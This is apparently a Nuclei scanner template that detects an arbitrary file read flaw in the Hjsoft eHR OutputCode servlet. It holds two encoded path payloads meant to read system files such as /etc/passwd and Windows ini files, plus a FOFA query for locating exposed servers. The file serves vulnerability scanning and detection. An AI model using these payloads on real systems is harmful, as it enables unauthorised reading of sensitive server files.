id: hjsoft-outputcode-fileread
info:
  name: 宏景人力资源管理系统 OutputCode - fileread
  author: leadlife
  severity: high
  description: The 宏景 eHR-OutputCodemodule is vulnerable to arbitrary file read, allowing attackers to read sensitive files on the server.
  reference:
    - todo
  metadata:
    verified: true
    fofa-query: app="HJSOFT-HCM"
  tags: hjsoft,fileread

http:
  - method: GET
    path:
      - "{{BaseURL}}/servlet/OutputCode?path=MrEzLLE8pPjFvPfyPAATTP2HJFPAATTPTwqF7eJiXGeHU4B"
      - "{{BaseURL}}/servlet/OutputCode?path=RNcrjWtNfJnkUMbX1UB6VAPAATTP3HJDPAATTPPAATTP3HJDPAATTP"

    stop-at-first-match: true
    matchers-condition: and
    matchers:
      - type: regex
        part: body
        regex:
          - "root:.*:0:0:"
          - "\\[(font|extension|file)s\\]"
        condition: or

      - type: status
        status:
          - 200